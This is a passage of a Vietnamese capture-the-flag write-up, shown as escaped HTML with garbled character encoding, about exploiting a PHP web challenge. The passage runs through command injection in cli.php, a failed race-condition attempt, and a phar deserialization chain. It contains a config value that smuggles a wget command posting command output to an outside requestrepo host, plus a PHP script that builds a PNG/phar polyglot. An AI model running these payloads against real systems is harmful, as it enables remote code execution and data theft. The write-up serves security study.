&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;config&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;db name=&amp;#34;username&amp;#34; value=&amp;#34;root&amp;#34;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;db name=&amp;#34;password&amp;#34; value=&amp;#34;root&amp;#34;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;db name=&amp;#34;database&amp;#34; value=&amp;#34;&amp;#34;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/config&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;HÃ m &lt;code&gt;generateFilename&lt;/code&gt; dÃ¹ng Ä‘á»ƒ táº¡o ra tÃªn file ngáº«u nhiÃªn khi sá»­ dá»¥ng method backup:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;function generateFilename() {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $timestamp = date(&amp;#34;Ymd_His&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $random = bin2hex(random_bytes(4));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $filename = &amp;#34;backup_$timestamp&amp;#34; . &amp;#34;_$random.sql&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return $filename;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;=&amp;gt; Káº¿t quáº£ cho ra file sql backup vá»›i filename sá»­ dá»¥ng káº¿t há»£p ngÃ y thÃ¡ng vÃ  8 kÃ½ tá»± random&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Method backup&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;function backup($filename, $username, $password, $database) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $backupdir = &amp;#34;/tmp/backup/&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; passthruOrFail(&amp;#34;mysqldump -u$username -p$password $database &amp;gt; $backupdir$filename&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Táº¡i method nÃ y, server thá»±c thi cÃ¢u lá»‡nh dump toÃ n bá»™ database vÃ o file Ä‘Æ°á»£c quy Ä‘á»‹nh trÆ°á»›c, vá»›i tÃªn filename gen random; 3 giÃ¡ trá»‹ username, password vÃ  database Ä‘Æ°á»£c láº¥y tá»« file config&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start="2"&gt;
&lt;li&gt;Method import&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;function import($filename, $username, $password, $database) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; passthruOrFail(&amp;#34;mysql -u$username -p$password $database &amp;lt; $filename&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Tiáº¿p tá»¥c sá»­ dá»¥ng cÃ¢u lá»‡nh há»‡ thá»‘ng Ä‘Æ°a dá»¯ liá»‡u cá»§a filename Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh vÃ o database&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start="3"&gt;
&lt;li&gt;Method healthcheck:&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;function healthCheck() {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $url = &amp;#39;http://localhost:80/info&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $headers = get_headers($url);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $responseCode = intval(substr($headers[0], 9, 3));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if ($responseCode === 200) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; echo &amp;#34;[+] Daijobu\n&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; } else {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; echo &amp;#34;[-] Not Daijobu :(\n&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;HÃ m truy cáº­p Ä‘áº¿n path info dÃ¹ng Ä‘á»ƒ hiá»ƒn thá»‹ phpinfo() vÃ  láº¥y status code tráº£ vá» thÃ´ng qua header. Náº¿u 200 thÃ¬ coi lÃ  á»•n, khÃ¡c thÃ¬ bá»‹ coi lÃ  khÃ´ng á»•n&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;=&amp;gt; Method backup vÃ  import cÃ³ kháº£ nÄƒng command injection náº¿u nhÆ° control Ä‘Æ°á»£c giÃ¡ trá»‹ trong file config. CÃ²n vá»›i option -f thÃ¬ khÃ´ng cháº¯c vÃ¬ nÃ³ cÅ©ng bá»‹ kiá»ƒm tra báº±ng &lt;code&gt;file_exists&lt;/code&gt; nÃªn khÃ´ng thá»ƒ command injection sau filename Ä‘Æ°á»£c.&lt;/p&gt;
&lt;h2 id="khai-thÃ¡c"&gt;Khai ThÃ¡c
&lt;/h2&gt;&lt;h3 id="command-injection-in-cliphp"&gt;Command Injection in cli.php
&lt;/h3&gt;&lt;p&gt;MÃ¬nh máº¥t má»™t lÃºc Ä‘á»ƒ nháº­n ra cÃ³ thá»ƒ truy cáº­p Ä‘áº¿n cli.php thÃ´ng qua website /cli/cli.php. NÃªn mÃ¬nh Ä‘ang nghÄ© Ä‘áº¿n command injection vÃ o cÃ¡c method, nhÆ°ng lÃ m tháº¿ nÃ o Ä‘á»ƒ bypass sá»­ dá»¥ng trÃªn command line?
Äang tÃ¬m cÃ¡ch thÃ¬ teammates cá»§a mÃ¬nh phÃ¡t hiá»‡n ra táº¡i php.ini giÃ¡ trá»‹ &lt;code&gt;register_argc_argv&lt;/code&gt; Ä‘Ã£ bá»‹ comment: GiÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c máº·c Ä‘á»‹nh lÃ  off, náº¿u nhÆ° config nÃ y Ä‘Æ°á»£c kÃ­ch hoáº¡t thÃ¬ mÃ¬nh hoÃ n toÃ n cÃ³ thá»ƒ truyá»n vÃ o giÃ¡ trá»‹ cá»§a 2 biáº¿n nÃ y thÃ´ng qua dáº¥u &lt;code&gt;+&lt;/code&gt; thay vÃ¬ dÃ¹ng dáº¥u &lt;code&gt;&amp;amp;&lt;/code&gt; Ä‘á»ƒ ngÄƒn cÃ¡ch.
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HkoZro1EC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/SkXyOoJN0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Váº­y thÃ¬ mÃ¬nh cÃ³ thá»ƒ lá»£i dá»¥ng viá»‡c nÃ y Ä‘á»ƒ truyá»n giÃ¡ trá»‹ vÃ o cÃ¡c tham sá»‘ -m vÃ  -c, thá»±c thi file cli.php nhÆ° Ä‘ang á»Ÿ command line, mÃ¬nh truy cáº­p thá»­ Ä‘áº¿n mode healthcheck thÃ¬ tháº¥y file hoÃ n toÃ n cÃ³ thá»ƒ thá»±c thi Ä‘Æ°á»£c:
&lt;img src="https://hackmd.io/_uploads/HyCfLjyE0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MÃ¬nh quyáº¿t Ä‘á»‹nh sáº½ láº¥y mode backup lÃ m sink Ä‘á»ƒ RCE, vá»›i viá»‡c sá»­ dá»¥ng DOMXPath query láº¥y dá»± liá»‡u tá»« file xml, mÃ¬nh táº¡m thá»i bá» qua viá»‡c upload file lÃªn nhÆ° nÃ o mÃ  craft má»™t file xml Ä‘á»ƒ command injection vÃ o username:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;config&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;db name=&amp;#34;username&amp;#34; value=&amp;#39;|| wget --post-data &amp;#34;$(id)&amp;#34; -O- ut8mgeo8.requestrepo.com ||&amp;#39;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;db name=&amp;#34;password&amp;#34; value=&amp;#34;root&amp;#34;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;db name=&amp;#34;database&amp;#34; value=&amp;#34;&amp;#34;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/config&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Äá»ƒ trÃ¡nh cÃ¢u lá»‡nh bá»‹ thá»±c thi khi echo vÃ o thÃ¬ mÃ¬nh base64 trÆ°á»›c rá»“i truyá»n vÃ o a.xml
&lt;img src="https://hackmd.io/_uploads/HJFQdoJE0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Thá»­ truyá»n vÃ o method backup vÃ  tÃªn file config lÃ : /tmp/a.xml
&lt;img src="https://hackmd.io/_uploads/SybD_oJ40.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
VÃ  mÃ¬nh tháº¥y káº¿t quáº£ tráº£ vá» requestrepo, Ä‘Ã¢y lÃ  sink Ä‘Ãºng Ä‘á»ƒ cÃ³ thá»ƒ RCE:
&lt;img src="https://hackmd.io/_uploads/BJmt_i1VA.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Oke váº­y lÃ  Ä‘Ã£ cÃ³ chá»— Ä‘á»ƒ RCE, váº¥n Ä‘á» cÃ²n láº¡i lÃ  upload file xml nÃ y lÃªn nhÆ° nÃ o vá»›i cÃ¡i rule whitelist kia thÃ´i.&lt;/p&gt;
&lt;h3 id="race-condition"&gt;Race Condition??
&lt;/h3&gt;&lt;p&gt;NhÆ° mÃ¬nh Ä‘Ã£ nÃ³i á»Ÿ trÃªn, cÃ³ 2 thá»© mÃ  mÃ¬nh tháº¥y mÃ¬nh chÆ°a sá»­ dá»¥ng Ä‘Æ°á»£c trong challenge nÃ y, thá»© nháº¥t lÃ  trang phpinfo, vÃ  thá»© 2 lÃ  cÃ¡i print_r hiá»‡n thÃ´ng tin cá»§a file. Khi PHP script nháº­n Ä‘Æ°á»£c má»™t file request, file Ä‘Ã³ sáº½ Ä‘Æ°á»£c lÆ°u táº¡m thá»i trong thÆ° má»¥c /tmp vÃ  cÃ³ thá»ƒ tÃ¹y chá»‰nh trong php.ini. Trong trÆ°á»ng há»£p nÃ y sáº½ lÃ  /tmp/php+6 kÃ½ tá»± [a-zA-Z0-9]. File trong thÆ° má»¥c tmp sáº½ biáº¿n máº¥t sau khi cÃ³ sá»± xuáº¥t hiá»‡n cá»§a hÃ m &lt;code&gt;move_uploaded_file&lt;/code&gt; hoáº·c khi PHP script Ä‘Ã³ káº¿t thÃºc. Nghe nÃ¡ nÃ¡ giá»‘ng vá»›i case LFI2RCE vá»›i phpinfo nÃªn mÃ¬nh vÃ  teammate triá»ƒn luÃ´n theo hÆ°á»›ng nÃ y.
Bá»n mÃ¬nh dá»± Ä‘á»‹nh sáº½ upload file sau Ä‘Ã³ vÃ o phpinfo Ä‘á»ƒ xem Ä‘Æ°á»ng dáº«n file tmp, rá»“i sá»­ dá»¥ng mode backup Ä‘á»ƒ command injection. NhÆ°ng sau khi thá»­ ráº¥t nhiá»u láº§n khÃ´ng Ä‘Æ°á»£c, mÃ¬nh Ä‘Ã£ Ä‘i tÃ¬m hiá»ƒu kÄ© hÆ¡n vÃ  nháº­n ra mÃ¬nh Ä‘Ã£ sai vÃ  chÆ°a hiá»ƒu báº£n cháº¥t: Lá»—i LFI2RCE vá»›i phpinfo xáº£y ra khi mÃ¬nh cÃ³ thá»ƒ upload file táº¡i trang phpinfo luÃ´n, tá»©c lÃ  cÃ³ thá»ƒ sá»­ dá»¥ng POST request. PHP sáº½ lÆ°u cÃ¡c file Ä‘Æ°á»£c upload lÃªn thÆ° má»¥c temp Ä‘á»‘i vá»›i cáº£ cÃ¡c PHP script khÃ´ng há» há»— trá»£ xá»­ lÃ½ file trong nÃ³, cÃ²n á»Ÿ Ä‘Ã¢y mÃ¬nh chá»‰ cÃ³ thá»ƒ GET /info, nÃªn cÃ¡ch nÃ y coi nhÆ° tiÃªu tÃ¹ng. Ref: &lt;a class="link" href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="noopener"
&gt;http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/&lt;/a&gt;
KhÃ´ng tá»« bá» viá»‡c race, mÃ¬nh quyáº¿t Ä‘á»‹nh Ä‘Ã¡nh vÃ o kháº£ nÄƒng print_r máº£ng vá» thÃ´ng tin file khi upload file táº¡i &lt;code&gt;/addProduct&lt;/code&gt;, nhÆ°ng viá»‡c nÃ y cÅ©ng báº¥t kháº£ thi vÃ¬ file Ä‘Ã£ Ä‘Æ°á»£c xá»­ xong xuÃ´i háº¿t r má»›i cÃ³ response tráº£ vá» cho mÃ¬nh, mÃ¬nh Ä‘Ã£ tá»‘n 2 ngÃ y Ä‘á»ƒ thá»­ theo phÆ°Æ¡ng phÃ¡p nÃ y vÃ  khÃ´ng thu Ä‘Æ°á»£c káº¿t quáº£ gÃ¬, váº­y lÃ  challenge Ä‘Ã£ khÃ´ng thá»ƒ solve ká»‹p trÆ°á»›c khi cuá»™c thi káº¿t thÃºc :((&lt;/p&gt;
&lt;h3 id="the-right-path-phar-deserialization"&gt;The right path: Phar Deserialization
&lt;/h3&gt;&lt;p&gt;MÃ¬nh cá»© máº£i Ä‘i race mÃ  khÃ´ng nghÄ© ra DOMDocument há»— trá»£ cáº£ file phar, tÆ°Æ¡ng tá»± nhÆ° trong case &lt;a class="link" href="https://blog.efiens.com/post/doublevkay/xxe-to-phar-deserialization/" target="_blank" rel="noopener"
&gt;XXE to Phar Deserialize&lt;/a&gt; khi DOMDocument-&amp;gt;loadXML cÃ³ thá»ƒ truyá»n vÃ o phar protocol thÃ¬ á»Ÿ Ä‘Ã¢y, DOMDocument-&amp;gt;load cÅ©ng cÃ³ thá»ƒ truyá»n vÃ o phar protocol -&amp;gt; +1 kiáº¿n thá»©c.
ThiÃªn thá»i Ä‘á»‹a lá»£i nhÃ¢n hÃ²a, config phar.readonly cÅ©ng Ä‘Æ°á»£c táº¯t =&amp;gt; cÃ³ thá»ƒ deser file phar:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ByzNl3kNR.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Náº¿u nhÆ° Ä‘Ã£ há»— trá»£ deser phar file, thÃ¬ mÃ¬nh chá»‰ cáº§n Ä‘á»ƒ file xml cá»§a mÃ¬nh vÃ o file phar vÃ  nhÃ©t vÃ o 1 file áº£nh valid lÃ  Ä‘Æ°á»£c. Vá» cÃ¡ch gen file phar nhÆ° nÃ o thÃ¬ mÃ¬nh sáº½ lÃ m tÆ°Æ¡ng tá»± nhÆ° chall upload phar file trong root me. Ref: &lt;a class="link" href="https://thanhlocpanda.wordpress.com/2023/08/07/php-phar-jpeg-polyglot-javascript-jpeg-polyglot-root-me-part-ii/" target="_blank" rel="noopener"
&gt;https://thanhlocpanda.wordpress.com/2023/08/07/php-phar-jpeg-polyglot-javascript-jpeg-polyglot-root-me-part-ii/&lt;/a&gt; (pass: thanhlocpanda)
ÄÆ°á»ng Ä‘i nÆ°á»›c bÆ°á»›c Ä‘Ã£ Ä‘á»§, mÃ¬nh tá»•ng há»£p láº¡i attack chain nhÆ° sau:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Gen file áº£nh cÃ ng ngáº¯n cÃ ng tá»‘t&lt;/li&gt;
&lt;li&gt;Láº¥y hex cá»§a file Ä‘Ã³, Ä‘áº¯p vÃ o file phar, chÃ¨n xml vÃ o file phar vÃ  Ä‘á»•i extension vá» áº£nh&lt;/li&gt;
&lt;li&gt;Upload file áº£nh, láº¥y Ä‘Æ°á»ng dáº«n áº£nh&lt;/li&gt;
&lt;li&gt;Gá»i Ä‘áº¿n cli.php, sá»­ dá»¥ng phar:// protocol gá»i Ä‘áº¿n file xml náº±m trong file phar =&amp;gt; RCE&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="final-exploit"&gt;Final Exploit
&lt;/h3&gt;&lt;p&gt;MÃ¬nh gen áº£nh 1 pixel cho nÃ³ bÃ© báº±ng Ä‘oáº¡n code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;from PIL import Image
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;img = Image.new(&amp;#34;RGB&amp;#34;, (1,1), (255,255,255))
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;img.save(&amp;#34;gen.png&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;MÃ¬nh láº¥y hex báº±ng cyberchef vÃ  Ä‘Æ°á»£c chuá»—i:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90\x77\x53\xde\x00\x00\x00\x0c\x49\x44\x41\x54\x78\x9c\x63\xf8\xff\xff\x3f\x00\x05\xfe\x02\xfe\x0d\xef\x46\xb8\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ÄÆ°a chuá»—i vÃ o scrip gen file phar, mÃ¬nh nhÃ©t file a.xml vá»›i payload Ä‘á»c flag báº±ng &lt;code&gt;/readflag&lt;/code&gt; vÃ o trong file phar, rá»“i Ä‘á»•i tÃªn file thÃ nh phar.png:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;?php
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $png = &amp;#34;\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90\x77\x53\xde\x00\x00\x00\x0c\x49\x44\x41\x54\x78\x9c\x63\xf8\xff\xff\x3f\x00\x05\xfe\x02\xfe\x0d\xef\x46\xb8\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $xml_data = &amp;#34;&amp;lt;config&amp;gt;&amp;lt;db name=\&amp;#34;username\&amp;#34; value=&amp;#39;|| wget --post-data \&amp;#34;$(/readflag)\&amp;#34; -O- ut8mgeo8.requestrepo.com ||&amp;#39;/&amp;gt;&amp;lt;db name=\&amp;#34;password\&amp;#34; value=\&amp;#34;root\&amp;#34;/&amp;gt;&amp;lt;db name=\&amp;#34;database\&amp;#34; value=\&amp;#34;\&amp;#34;/&amp;gt;&amp;lt;/config&amp;gt;&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $phar = new Phar(&amp;#34;phar.phar&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $phar-&amp;gt;startBuffering();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $phar-&amp;gt;addFromString(&amp;#34;a.xml&amp;#34;, $xml_data);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $phar-&amp;gt;setStub($png.&amp;#34;__HALT_COMPILER(); ?&amp;gt;&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; $phar-&amp;gt;stopBuffering();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; rename(&amp;#39;phar.phar&amp;#39;, &amp;#39;phar.png&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Upload file phar lÃªn server thÃ nh cÃ´ng:
&lt;img src="https://hackmd.io/_uploads/B1NAW3J4C.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
VÃ o list product Ä‘á»ƒ láº¥y tÃªn áº£nh, cá»§a mÃ¬nh lÃ  &lt;code&gt;/uploads/3e10700de9433bdb.png&lt;/code&gt;
